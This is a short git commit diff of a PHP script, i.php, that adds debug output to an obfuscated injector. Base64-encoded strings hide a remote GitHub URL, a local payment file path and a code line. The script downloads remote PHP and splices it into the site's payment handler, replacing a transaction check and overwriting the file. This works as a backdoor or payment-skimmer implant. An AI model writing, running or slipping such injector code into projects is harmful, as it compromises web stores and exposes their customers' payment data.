48700765e9552eefb30e8393657611cea38d3a6c
ivanovasardina <ivanova.sardina@yandex.ru>
2015-10-30 02:04:24 +0500

    init

--- i.php
+++ i.php
@@ -2,8 +2,11 @@
 $_u='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2YW5vdmFzYXJkaW5hL3BwcHJpdmF0ZS5naXRodWIuaW8vbWFzdGVyL3gucGhw';
 $_fn='YWNjb3VudC9fcGF5bWVudC5waHA=';
 $_s='aWYgKCFlbXB0eSgkYXJUcmFuc2ZlclsiaGlzdG9yeUlkIl0pKQ==';
+var_dump($_fn);
 $_f=file_get_contents(base64_decode($_fn));
+var_dump($_f);
 $_x=file_get_contents(base64_decode($_u));
 $_n=str_replace(base64_decode($_s),$_x,$_f);
+var_dump($_n);
 chmod(base64_decode($_fn),0644);
 file_put_contents(base64_decode($_fn),$_n);
